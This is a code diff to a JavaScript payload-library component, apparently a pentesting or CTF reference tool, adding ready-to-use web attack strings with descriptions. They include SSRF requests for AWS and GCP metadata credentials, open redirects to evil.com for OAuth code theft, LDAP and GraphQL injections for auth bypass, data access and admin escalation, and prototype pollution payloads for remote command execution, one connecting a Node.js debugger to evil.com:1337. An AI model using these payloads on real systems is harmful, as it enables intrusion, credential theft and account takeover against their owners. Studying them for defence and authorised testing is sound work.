@@ -66,12 +66,43 @@ const PAYLOADS = [
   { id: 45, category: 'SSRF', subcategory: 'AWS Metadata', severity: 'Critical', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', description: 'AWS EC2 IMDS — retrieve IAM instance role credentials.' },
   { id: 46, category: 'SSRF', subcategory: 'Bypass', severity: 'High', payload: 'http://127.1/', description: 'Alternative localhost representation to bypass filters blocking "localhost" and "127.0.0.1".' },
   { id: 47, category: 'SSRF', subcategory: 'Bypass', severity: 'High', payload: 'http://0x7f000001/', description: 'Hexadecimal representation of 127.0.0.1 — bypasses naive filters.' },
+  { id: 48, category: 'SSRF', subcategory: 'GCP Metadata', severity: 'Critical', payload: 'http://metadata.google.internal/computeMetadata/v1/', description: 'GCP instance metadata service — steal service account access tokens.' },
+
+  // ── Open Redirect ──────────────────────────
+  { id: 49, category: 'Open Redirect', subcategory: 'Basic', severity: 'Medium', payload: '?redirect=https://evil.com', description: 'Basic open redirect via redirect parameter.' },
+  { id: 50, category: 'Open Redirect', subcategory: 'Basic', severity: 'Medium', payload: '?url=https://evil.com', description: 'Open redirect via url parameter — extremely common in SSO and OAuth flows.' },
+  { id: 51, category: 'Open Redirect', subcategory: 'Protocol Bypass', severity: 'Medium', payload: '?redirect=//evil.com', description: 'Protocol-relative URL — works when the app prepends https: but strips your input.' },
+  { id: 52, category: 'Open Redirect', subcategory: 'Path Bypass', severity: 'Medium', payload: '?next=/\/evil.com', description: 'Backslash followed by / bypasses filters that look for double forward slash.' },
+  { id: 53, category: 'Open Redirect', subcategory: 'Encoded', severity: 'Medium', payload: '?redirect=https%3A%2F%2Fevil.com', description: 'URL-encoded redirect URL — bypasses simple string filters.' },
+  { id: 54, category: 'Open Redirect', subcategory: 'OAuth Abuse', severity: 'High', payload: '?redirect_uri=https://evil.com/callback', description: 'OAuth redirect_uri manipulation — steal authorization codes to hijack accounts.' },
+
+  // ── LDAP Injection ────────────────────────
+  { id: 55, category: 'LDAP Injection', subcategory: 'Auth Bypass', severity: 'Critical', payload: '*)(&', description: 'LDAP auth bypass — terminates the filter early and injects a wildcard match-all.' },
+  { id: 56, category: 'LDAP Injection', subcategory: 'Auth Bypass', severity: 'Critical', payload: '*)(uid=*))(|(uid=*', description: 'Blind LDAP injection — always evaluates to true for any username.' },
+  { id: 57, category: 'LDAP Injection', subcategory: 'Enumeration', severity: 'High', payload: '*(|(mail=*))', description: 'Enumerate all user email addresses via LDAP filter injection.' },
+  { id: 58, category: 'LDAP Injection', subcategory: 'Enumeration', severity: 'High', payload: '*))(|(objectclass=*', description: 'Return all LDAP directory objects — full directory dump.' },
+  { id: 59, category: 'LDAP Injection', subcategory: 'Admin Bypass', severity: 'Critical', payload: 'admin)(&)', description: 'Log in as admin by closing the filter and adding an always-true condition.' },
+
+  // ── GraphQL Injection ──────────────────────
+  { id: 60, category: 'GraphQL', subcategory: 'Introspection', severity: 'Medium', payload: '{__schema{types{name}}}', description: 'GraphQL introspection query — discover all types, queries, and mutations in the API.' },
+  { id: 61, category: 'GraphQL', subcategory: 'Introspection', severity: 'Medium', payload: '{__type(name:"User"){fields{name type{name}}}}', description: 'Get all fields in the User type — reveals hidden fields like isAdmin or passwordHash.' },
+  { id: 62, category: 'GraphQL', subcategory: 'IDOR', severity: 'High', payload: '{user(id:1){id email password role}}', description: 'Access another user\'s sensitive data via IDOR on the id argument.' },
+  { id: 63, category: 'GraphQL', subcategory: 'Mutation', severity: 'Critical', payload: 'mutation{updateUser(id:1,role:"admin"){role}}', description: 'Privilege escalation via unauthenticated mutation — promote self to admin.' },
+  { id: 64, category: 'GraphQL', subcategory: 'DOS', severity: 'Medium', payload: '{users{friends{friends{friends{email}}}}}', description: 'GraphQL query depth attack (DoS) — unbounded nested resolution crashes the server.' },
+  { id: 65, category: 'GraphQL', subcategory: 'Batching', severity: 'High', payload: '[{"query":"mutation{login(user:\\"admin\\",pass:\\"a\\")"}},{"query":"mutation{login(user:\\"admin\\",pass:\\"b\\")}"}]', description: 'GraphQL query batching to brute-force credentials — bypasses per-request rate limiting.' },
+
+  // ── Prototype Pollution ─────────────────────
+  { id: 66, category: 'Prototype Pollution', subcategory: 'Basic', severity: 'High', payload: '{"__proto__":{"admin":true}}', description: 'JSON prototype pollution — poisons Object.prototype.admin to bypass admin checks.' },
+  { id: 67, category: 'Prototype Pollution', subcategory: 'Basic', severity: 'High', payload: '{"constructor":{"prototype":{"isAdmin":true}}}', description: 'Constructor prototype pollution path — alternative vector when __proto__ is filtered.' },
+  { id: 68, category: 'Prototype Pollution', subcategory: 'RCE', severity: 'Critical', payload: '{"__proto__":{"execPath":"/bin/sh","execArgv":["--eval","require(\'child_process\').exec(\'/readflag > /tmp/f\')"]}}', description: 'Node.js prototype pollution to RCE via child_process in unsafe merge functions.' },
+  { id: 69, category: 'Prototype Pollution', subcategory: 'URL Parameter', severity: 'High', payload: '?__proto__[admin]=1', description: 'Query string prototype pollution — many Express.js parsers are vulnerable to this.' },
+  { id: 70, category: 'Prototype Pollution', subcategory: 'Gadget Chain', severity: 'Critical', payload: '{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=evil.com:1337"}}', description: 'Prototype pollution + NODE_OPTIONS gadget — forces Node.js to connect debugger to attacker server.' },
 ];
 
 const categories = ['All', ...new Set(PAYLOADS.map(p => p.category))];
 const sevColor = { Critical: '#f87171', High: '#fbbf24', Medium: '#60a5fa', Low: '#34d399' };
-const catColor = { 'XSS': '#a78bfa', 'SQL Injection': '#f87171', 'Command Injection': '#fb923c', 'SSTI': '#fbbf24', 'Path Traversal': '#38bdf8', 'XXE': '#c084fc', 'SSRF': '#34d399' };
-const catIcon = { 'XSS': '⚡', 'SQL Injection': '🗄️', 'Command Injection': '💻', 'SSTI': '🔧', 'Path Traversal': '📁', 'XXE': '📄', 'SSRF': '🔗' };
+const catColor = { 'XSS': '#a78bfa', 'SQL Injection': '#f87171', 'Command Injection': '#fb923c', 'SSTI': '#fbbf24', 'Path Traversal': '#38bdf8', 'XXE': '#c084fc', 'SSRF': '#34d399', 'Open Redirect': '#fb7185', 'LDAP Injection': '#818cf8', 'GraphQL': '#34d399', 'Prototype Pollution': '#f59e0b' };
+const catIcon = { 'XSS': '⚡', 'SQL Injection': '🗄️', 'Command Injection': '💻', 'SSTI': '🔧', 'Path Traversal': '📁', 'XXE': '📄', 'SSRF': '🔗', 'Open Redirect': '↪️', 'LDAP Injection': '📂', 'GraphQL': '⬡', 'Prototype Pollution': '🧬' };
 
 const PayloadLibrary = () => {
   const [search, setSearch] = useState('');
